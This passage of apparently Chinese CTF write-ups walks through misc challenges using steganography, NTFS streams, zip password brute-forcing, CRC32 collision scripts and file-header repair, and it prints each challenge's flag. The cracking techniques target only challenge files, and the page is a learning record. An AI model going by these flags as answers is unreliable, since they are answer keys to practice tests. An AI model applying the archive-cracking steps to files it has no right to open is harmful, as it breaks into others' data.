class="headerlink" title="012.[ACTF新生赛2020]outguess"></a>012.[ACTF新生赛2020]outguess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.有个mmm.jpg看详细信息`公正民主公正文明公正和谐`，社会主义核心价值观解密后为`abc`。</span><br><span class="line">2.outguess昨天刚用过，是个加密工具，还在kali上面，使用下面的命令解密。`outguess -k &quot;abc&quot; -r mmm.jpg flag.txt`</span><br><span class="line">3.ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br><span class="line">4.flag&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure><h2 id="013-SWPU2019-我有一只马里奥"><a href="#013-SWPU2019-我有一只马里奥" class="headerlink" title="013.[SWPU2019]我有一只马里奥"></a>013.[SWPU2019]我有一只马里奥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.exe文件点击运行之后出现了1.txt看里面的内容是ntfs，考虑ntfs文件隐写.</span><br><span class="line">2.就是后面有:flag.txt:$DATA的内容看不了，用工具打开之后就能看得到了。工具名:NtfsStreamsEditor</span><br><span class="line">3.swpuctf&#123;ddg_is_cute&#125;</span><br><span class="line">3.flag&#123;ddg_is_cute&#125;</span><br></pre></td></tr></table></figure><h2 id="014-谁赢了比赛？"><a href="#014-谁赢了比赛？" class="headerlink" title="014.谁赢了比赛？"></a>014.谁赢了比赛？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.解压后是张图片，打开看看是棋谱？？？没啥用，binwalk分离出压缩包，有加密。</span><br><span class="line">2.爆破，wuwuwu，四位数字试一下(其实我是看wp是四位数字，这misc。。。)，用ARCHOPR爆。</span><br><span class="line">3.口令是1020，谁爆谁知道，打开一看有个gif，有个没用的txt提示，帧分离一下，共360帧，我是在网上下的软件进行分离的，不用点了。。。</span><br><span class="line">3.从0开始309帧明显有问题（有个do you know where is the flag），拖进stegsolve里面，red plane 0发现二维码，</span><br><span class="line">4.flag&#123;shanxiajingwu_won_the_game&#125;</span><br></pre></td></tr></table></figure><h2 id="015-Mysterious"><a href="#015-Mysterious" class="headerlink" title="015.Mysterious"></a>015.Mysterious</h2><p>逆向一下，拖进ida，首先看start函数，发现没什么发现之后查看字符串，发现well done样的字符串，分析关键反汇编代码也许就在这里，双击跳转到反汇编那里，审计一下c源码，知道想让我们输入的内容需要少于等于六个，然后下面还有条件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 122 &amp;&amp; String[3] == &#x27;x&#x27; &amp;&amp; String[5] == &#x27;z&#x27; &amp;&amp; String[4] == &#x27;y&#x27; )</span><br></pre></td></tr></table></figure><p>这样才可以，然后v4的值类型为int，并且字符串的后面的连续的三位须是<code>xyz</code>，输入<code>122xyz</code>就能拿到flag了，上面还对这里的输入进行类型转换了，不过对大局影响不大。<br><code>flag&#123;123_Buff3r_0v3rf|0w&#125;</code>，逆向分析一下也可以得flag，挺简单的一道逆向题目吧。</p><h2 id="016-GXYCTF2019-gakki"><a href="#016-GXYCTF2019-gakki" class="headerlink" title="016.[GXYCTF2019]gakki"></a>016.[GXYCTF2019]gakki</h2><p>解压出图片，分离出压缩包，爆破出密码8864，用新学到的jieba库做个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Name:         6.6.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment"># Author:       M4XLMUM</span></span><br><span class="line"><span class="comment"># Date:         2020/12/22</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">words = <span class="built_in">list</span>(txt)</span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    counts[word] = counts.get(word, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">items = <span class="built_in">list</span>(counts.items())</span><br><span class="line">items.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    word, count = items[i]</span><br><span class="line">    <span class="built_in">print</span>(word, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得flag<code>GXY&#123;gaki_IsMyw1fe&#125;</code>,<code>flag&#123;gaki_IsMyw1fe&#125;</code></p><h2 id="017-HBNIS2018-excel破解"><a href="#017-HBNIS2018-excel破解" class="headerlink" title="017.[HBNIS2018]excel破解"></a>017.[HBNIS2018]excel破解</h2><p>直接用HXD打开全局搜索一下flag，找到flag is here字样，定位到该位置发现flag<code>CTF&#123;office_easy_cracked&#125;</code><br><code>flag&#123;office_easy_cracked&#125;</code></p><h2 id="018-HBNIS2018-来题中等的吧"><a href="#018-HBNIS2018-来题中等的吧" class="headerlink" title="018.[HBNIS2018]来题中等的吧"></a>018.[HBNIS2018]来题中等的吧</h2><p>给的是一张图片，像是摩斯，先不管先binwalk没啥发现。<br>转成摩斯<code>.-/.-../.--./..../.-/.-../.-/-...</code>解密为<code>ALPHALAB</code>没了，<code>flag&#123;alphalab&#125;</code></p><h2 id="019-SWPU2019-伟大的侦探"><a href="#019-SWPU2019-伟大的侦探" class="headerlink" title="019.[SWPU2019]伟大的侦探"></a>019.[SWPU2019]伟大的侦探</h2><p>010editor使用EBCDIC打开，然后获得密码<code>wllm_is_the_best_team!</code>，解压后是跳舞的小人密码<br>懒得解码了没啥用<code>iloveholmesandwllm</code><br><code>flag&#123;iloveholmesandwllm&#125;</code></p><h2 id="020-黑客帝国"><a href="#020-黑客帝国" class="headerlink" title="020.黑客帝国"></a>020.黑客帝国</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jack很喜欢看黑客帝国电影，一天他正在上网时突然发现屏幕不受控制，出现了很多数据再滚屏，结束后留下了一份神秘的数据文件，难道这是另一个世界给Jack留下的信息？聪明的你能帮Jack破解这份数据的意义吗？ 注意：得到的 flag 请包上 flag&#123;&#125; 提交</span><br></pre></td></tr></table></figure><p>十六进制数据，hex恢复一下源文件为<code>1.rar</code>有密码，爆破得密码3690解压得图片png图片显示格式错误打不开，winhex打开图片，文件有jfif该是jpg，但是文件头却改成了png的文件头，改回<code>FF D8 FF 00</code>后缀名改为<code>.jpg</code>即可获得图片，图片上有flag。<code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</code></p><blockquote><p>下面总结一些常见的文件的文件头</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FFD8FF </span><br><span class="line">PNG (png)，文件头：89504E47 </span><br><span class="line">GIF (gif)，文件头：47494638 </span><br><span class="line">TIFF (tif)，文件头：49492A00 </span><br><span class="line">Windows Bitmap (bmp)，文件头：424D </span><br><span class="line">CAD (dwg)，文件头：41433130 </span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053 </span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466 </span><br><span class="line">XML (xml)，文件头：3C3F786D6C </span><br><span class="line">HTML (html)，文件头：68746D6C3E </span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A </span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F </span><br><span class="line">Outlook (pst)，文件头：2142444E </span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 </span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A </span><br><span class="line">WordPerfect (wpd)，文件头：FF575043 </span><br><span class="line">Postscript (eps.or.ps)，文件头：252150532D41646F6265 </span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E </span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F </span><br><span class="line">Windows Password (pwl)，文件头：E3828596 </span><br><span class="line">ZIP Archive (zip)，文件头：504B0304 </span><br><span class="line">RAR Archive (rar)，文件头：52617221 </span><br><span class="line">Wave (wav)，文件头：57415645 </span><br><span class="line">AVI (avi)，文件头：41564920 </span><br><span class="line">Real Audio (ram)，文件头：2E7261FD </span><br><span class="line">Real Media (rm)，文件头：2E524D46 </span><br><span class="line">MPEG (mpg)，文件头：000001BA </span><br><span class="line">MPEG (mpg)，文件头：000001B3 </span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76 </span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11 </span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br></pre></td></tr></table></figure><h2 id="021-WUSTCTF2020-find-me"><a href="#021-WUSTCTF2020-find-me" class="headerlink" title="021.[WUSTCTF2020]find_me"></a>021.[WUSTCTF2020]find_me</h2><p>属性》详细信息》备注》发现盲文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</span><br></pre></td></tr></table></figure><p>解密，<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">解密网站</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</span><br><span class="line">flag&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</span><br></pre></td></tr></table></figure><h2 id="022-弱口令"><a href="#022-弱口令" class="headerlink" title="022.弱口令"></a>022.弱口令</h2><p>用360zip打开有预览，预览里面看有内容，复制出来到记事本，用sublim打开之后能看到摩斯密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...././.-../.-../-----/..-./---/.-./..-/--</span><br></pre></td></tr></table></figure><p>解密后的内容为<code>HELL0FORUM</code>即是密码，用ziperello那个程序估计要多少天或者多少个月呜呜，弱密码啥时候到十位了呜呜。<br>解压后是一张图片，看wp是lsb隐写，有专门的软件。<br><a href="https://github.com/livz/cloacked-pixel">lsb隐写-python2环境</a><br>稍微配置一下环境，运行后得flag<br><code>flag&#123;jsy09-wytg5-wius8&#125;</code></p><h2 id="023-MRCTF2020-你能看懂音符吗"><a href="#023-MRCTF2020-你能看懂音符吗" class="headerlink" title="023.[MRCTF2020]你能看懂音符吗"></a>023.[MRCTF2020]你能看懂音符吗</h2><p>记事本打开发现文件头错了改回文件头，rar文件的文件头为<code>52 61 72 21</code>，用winhex打开文件改下文件头，52 61调下位置即可。<br>解压出word文件打开，word隐藏文字复制不出来，选中不能复制的部分ctrl+f然后复制就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=这都让你发现了，可是你能看懂吗？</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">音符解密</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</span><br><span class="line">flag&#123;thEse_n0tes_ArE_am@zing~&#125;</span><br></pre></td></tr></table></figure><h2 id="024-john-in-the-middle"><a href="#024-john-in-the-middle" class="headerlink" title="024.john-in-the-middle"></a>024.john-in-the-middle</h2><p>是个流量包，用wireshark打开之后注意到有不少http流量，导出http对象，批量save all即可，<br>导出的东西重要看那几张图片，注意到scanline那张图片里面gba三通道里面都有一条特殊的线，而logo图片也有问题，然后用stegsolve的combiner功能整一下，sub模式下发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;J0hn_th3_Sn1ff3r&#125;</span><br></pre></td></tr></table></figure><h2 id="025-zip"><a href="#025-zip" class="headerlink" title="025.zip"></a>025.zip</h2><p>压缩包里的txt文件太小了，考虑crc碰撞，下面是crc的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackCrc</span>(<span class="params">crc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic: </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + k + h</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackZip</span>():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">            file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">            crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">            CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CRC32碰撞完成&quot;</span>)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>放到pycharm里面可正常运行，pycharm，pyide的神，芜湖。解出来的字符串像是一段base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</span><br></pre></td></tr></table></figure><p>直接把txt文件用notepad++打开之后选中全部插件base64 decoder就好了(别忘了ctrl s)，后改文件为rar，用winhex打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rar文件的尾部为</span><br><span class="line">C4 3D 7B 00 40 07 00</span><br><span class="line"></span><br><span class="line">rar文件的头部数据为</span><br><span class="line">52 61 72 21 1A 07 00</span><br></pre></td></tr></table></figure><p>将rar的头部数据粘贴进去即可修复压缩包获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;nev3r_enc0de_t00_sm4ll_fil3_w1th_zip&#125;</span><br></pre></td></tr></table></figure><h2 id="026-GUET-CTF2019-KO"><a href="#026-GUET-CTF2019-KO" class="headerlink" title="026.[GUET-CTF2019]KO"></a>026.[GUET-CTF2019]KO</h2><p>进去就是老ook编码了，得flag，<code>welcome to CTF</code>，故flag为<code>flag&#123;welcome to CTF&#125;</code></p><p><a href="https://www.splitbrain.org/services/ook">Ook!在线工具网址</a></p><h2 id="027-HBNIS2018-caesar"><a href="#027-HBNIS2018-caesar" class="headerlink" title="027.[HBNIS2018]caesar"></a>027.[HBNIS2018]caesar</h2><p>凯撒密码，偏移量为25或者1，flag为<code>flag&#123;flagiscaesar&#125;</code></p><h2 id="028-SWPU2019-你有没有好好看网课"><a href="#028-SWPU2019-你有没有好好看网课" class="headerlink" title="028.[SWPU2019]你有没有好好看网课"></a>028.[SWPU2019]你有没有好好看网课</h2><p>有个压缩包flag3zip提示是六位数字，爆破出密码为<code>183792</code>秒出可太秀了，用时0秒zipere永远滴神。大约是几毫秒。<br>docx发现提示520与提示711，pr打开进入520时发现类似莫斯的东西，711处发现base64，分别如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..... ../... ./... ./... ../</span><br><span class="line">dXBfdXBfdXA=</span><br></pre></td></tr></table></figure><p>第一个是敲击码，第二个是base64，用python也可解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;dXBfdXBfdXA=&quot;</span>))</span><br><span class="line"><span class="string">b&#x27;up_up_up&#x27;</span></span><br></pre></td></tr></table></figure><p>敲击码解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">..... ../... ./... ./... ../</span><br><span class="line">5,2/3,1/3,1/3,2/    手解即可，先横后竖。</span><br><span class="line">0   1   2   3   4   5</span><br><span class="line">1   A   B  C/K  D   E</span><br><span class="line">2   F   G   H   I   J</span><br><span class="line">3   L   M   N   O   P</span><br><span class="line">4   Q   R   S   T   U</span><br><span class="line">5   V   W   X   Y   Z</span><br></pre></td></tr></table></figure><p>WLLM<br>故可得flag2压缩包的密码为<code>wllmup_up_up</code><br>图片用winhex打开ascii部分发现flag<br><code>swpuctf&#123;A2e_Y0u_Ok?&#125;</code><br><code>flag&#123;A2e_Y0u_Ok?&#125;</code></p><h2 id="029-MRCTF2020-ezmisc"><a href="#029-MRCTF2020-ezmisc" class="headerlink" title="029.[MRCTF2020]ezmisc"></a>029.[MRCTF2020]ezmisc</h2><p>考虑高度隐写，修改第二行第六位数据01为02，在看图片得flag<br><code>MRCTF&#123;1ts_vEryyyyyy_ez!&#125;</code><br><code>flag&#123;1ts_vEryyyyyy_ez!&#125;</code></p><h2 id="030-HBNIS2018-低个头"><a href="#030-HBNIS2018-低个头" class="headerlink" title="030.[HBNIS2018]低个头"></a>030.[HBNIS2018]低个头</h2><p>考虑键盘密码，考虑组成的形状为英文字母<code>CTF</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EWAZX RTY TGB IJN IO KL</span><br><span class="line"></span><br><span class="line">CTF</span><br></pre></td></tr></table></figure><p><code>flag&#123;CTF&#125;</code></p><h2 id="031-GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#031-GXYCTF2019-SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="031.[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>031.[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h2><p>题目翻译过来就是<code>Is this base?</code>，base64隐写，炒个脚本来用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inttobin</span>(<span class="params">a, n</span>):</span><br><span class="line">    ret = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(ret) &lt; n:</span><br><span class="line">        ret = <span class="string">&#x27;0&#x27;</span> + ret</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">line = f.readline()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    <span class="keyword">if</span> line[-<span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> line[-<span class="number">4</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">5</span>]), <span class="number">6</span>)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">4</span>]), <span class="number">6</span>)[<span class="number">4</span>:]</span><br><span class="line">    line = f.readline()</span><br><span class="line">quotient = <span class="built_in">len</span>(tmpbin)/<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(quotient):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure><p><code>GXY&#123;fazhazhenhaoting&#125;</code><br><code>flag&#123;fazhazhenhaoting&#125;</code></p><h2 id="032-ACTF新生赛2020-NTFS数据流"><a href="#032-ACTF新生赛2020-NTFS数据流" class="headerlink" title="032.[ACTF新生赛2020]NTFS数据流"></a>032.[ACTF新生赛2020]NTFS数据流</h2><p>好多txt，没flag就是flag is not here，写个脚本找一下异常的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        line = file.readline()</span><br><span class="line">        <span class="keyword">if</span> line != <span class="string">&quot;flag is not here&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>293.txt不太一样打开看看。ctrl c出来，用NtfsStreamsEditor查一下发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;AAAds_nntfs_ffunn?&#125;</span><br><span class="line">flag&#123;AAAds_nntfs_ffunn?&#125;</span><br></pre></td></tr></table></figure><h2 id="033-间谍启示录"><a href="#033-间谍启示录" class="headerlink" title="033.间谍启示录"></a>033.间谍启示录</h2><blockquote><p>往后都加个TAG标签吧，到时候好找到。</p></blockquote><p><strong>TAG：misc，未解</strong></p><h2 id="034-我吃三明治"><a href="#034-我吃三明治" class="headerlink" title="034.我吃三明治"></a>034.我吃三明治</h2><p><strong>TAG：foremost，脑洞，base32</strong></p><p>用foremost分离出了两张三明治的图片，定睛一看并不一样，但是没什么鸟用，联想到三明治是夹心的，故找到两张图片的交界处37408行发现类似base32的代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</span><br></pre></td></tr></table></figure><p>解码得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6f1797d4080b29b64da5897780463e30&#125;</span><br></pre></td></tr></table></figure><h2 id="034-V-amp-N2020-公开赛-拉胯的三条命令"><a href="#034-V-amp-N2020-公开赛-拉胯的三条命令" class="headerlink" title="034.[V&amp;N2020 公开赛]拉胯的三条命令"></a>034.[V&amp;N2020 公开赛]拉胯的三条命令</h2><p><strong>TAG：流量分析，未解</strong></p><p>首先解压zip打开提示，提示内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在参加网络安全大赛第二届世界巡回赛新加坡站一场与SP战队的比赛时，作为K&amp;K战队主防手的你使用经典的“三条命令”检查端口封闭状况。可是这次比赛平台没有回显，你能查出来有哪些端口是开放的嘛？</span><br><span class="line">请将开放端口按由小到大顺序写入flag中 如：开放1、22、234端口，flag&#123;122234&#125;</span><br></pre></td></tr></table></figure><h2 id="035-安洵杯-2019-吹着贝斯扫二维码"><a href="#035-安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="035.[安洵杯 2019]吹着贝斯扫二维码"></a>035.[安洵杯 2019]吹着贝斯扫二维码</h2><p><strong>TAG：拼二维码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 